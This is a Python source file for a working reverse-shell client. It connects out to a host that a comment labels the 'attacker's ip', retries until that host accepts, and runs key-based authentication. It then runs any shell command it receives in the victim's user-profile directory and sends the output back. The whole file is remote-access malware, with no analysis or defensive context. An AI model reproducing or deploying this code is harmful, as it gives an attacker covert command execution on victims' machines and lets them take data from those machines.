import socket
import subprocess
from secrets import token_hex
from datetime import datetime
import os
from clipboard import copy
import time
import shutil
import sys
from random import randint
from key_generator.key_generator import generate
import time

curdir = os.path.dirname(os.path.realpath(__file__)).replace('\\','/')+'/'
usp = os.environ['USERPROFILE'].replace('\\','/')+'/'

print('[c] Logging PID ...')
open(curdir+'PID.txt', 'a', encoding='utf-8').write(str(os.getpid())+'\n')
print('[c] PID Logged')
rhost = '192.168.2.5' #attacker's ip
rport = 8081

def keygen(numseed):
    curdate = datetime.now()
    dmy = curdate.day+curdate.month+curdate.year
    time = curdate.hour+curdate.minute
    timeseed = dmy+time
    key = generate(num_of_atom=1, separator='', min_atom_len=24, max_atom_len=24, type_of_value='hex', capital='mix', extras=['!','@','#','%','^','&','*','_','-','+','?'], seed=numseed+timeseed).get_key()
    return key

def main():
    try:
        client = socket.socket()
        print('[c] Connection Initiating ...')
        while True:
            try:
                client.connect((rhost, rport))
                print('[c] Connection initiated')
            except ConnectionRefusedError:
                time.sleep(0.5)
            except TimeoutError:
                time.sleep(0.5)
            except OSError:
                time.sleep(0.5)
            else:
                break

        try:
            while True:
                numseed = randint(10000,999999)
                key = keygen(numseed)
                client.send(str(numseed).encode())
                print('[c] Waiting for authentication key ...')
                recvkey = client.recv(1024).decode()
                if key != recvkey:
                    client.send('KEYAUTHERR'.encode())
                    print('[c] Key authentication error')
                else:
                    client.send('KEYAUTHSUC'.encode())
                    print('[c] Authentication key accepted')
                    break

            client.send(usp.encode())
            path = usp

            while True:
                print('[c] Awaiting commands...')
                command = client.recv(1024).decode()
                print('[c] Command recived : '+command)
                cmds = command.split(' ')
                opath = path
                if cmds[0] == 'cd':
                    if len(cmds) != 1:
                        if cmds[1] == '..' or cmds[1] == '..\\' or cmds[1] == '../':
                            path = '/'.join(path.split('/')[:-2])+'/'
                        else:
                            if cmds[1][1] == ':':
                                path = cmds[1].replace('\\','/')+'/'
                            else:
                                path += cmds[1]+'/'
                        command = 'cd ../'
                path = path.replace('//', '/')
                if path != '/':
                    if os.path.isdir(path):
                        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, cwd=path)
                        output = op.stdout.read()
                        output_error = op.stderr.read()
                    else:
                        path = opath
                        output = ''.encode()
                        output_error = 'The system cannot find the path specified.\n'.encode()
                else:
                    path = opath
                    output = ''.encode()
                    output_error = ''.encode()
                current_datetime = datetime.now()
                print('[c] Logging response ...')
                d = str(current_datetime.day)
                m = str(current_datetime.month)
                y = str(current_datetime.year)
                open(curdir+'response.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s\noutput :\n%s' 
                    % (d,m,y,current_datetime.strftime('%H:%M:%S'),command,(output+output_error).decode()))
                print('[c] Sending response ...')
                client.send(output+output_error+'ENDOFTRANSMISSION'.encode())
                print('[c] Response sent')
                client.send(path.encode())
        except ConnectionAbortedError:
            print('[c] Connection aborted by server')
    except KeyboardInterrupt:
        logerror()
    except:
        logerror()

def logerror(double = False):
    current_datetime = datetime.now()
    d = str(current_datetime.day)
    m = str(current_datetime.month)
    y = str(current_datetime.year)
    add = ''
    if double == True:
        add = ' [catched outside main]'
    print('[c] Error catched : ' + str(sys.exc_info()[0])[8:-2] + add)
    print('[c] Logging error ...')
    open(curdir+'error.txt', 'a', encoding='utf-8').write('%s-%s-%s %s : %s%s\n' % (d,m,y,current_datetime.strftime('%H:%M:%S'),str(sys.exc_info()[0])[8:-2],add))
    print('[c] Error logged')

def delpidlog():
    print('[c] Deleting PID from log ...')
    shutil.copy(curdir+'PID.txt', curdir+'PIDt.txt')
    with open(curdir+'PIDt.txt', 'r') as fin:
        with open(curdir+'PID.txt', 'w') as fout:
            for line in fin:
                fout.write(line.replace(str(os.getpid())+'\n', ''))
    os.remove(curdir+'PIDt.txt')
    print('[c] PID deleted from log')

while True:
    try:
        main()
    except KeyboardInterrupt:
        logerror(True)
        delpidlog()
        break
    except:
        logerror(True)
        main()
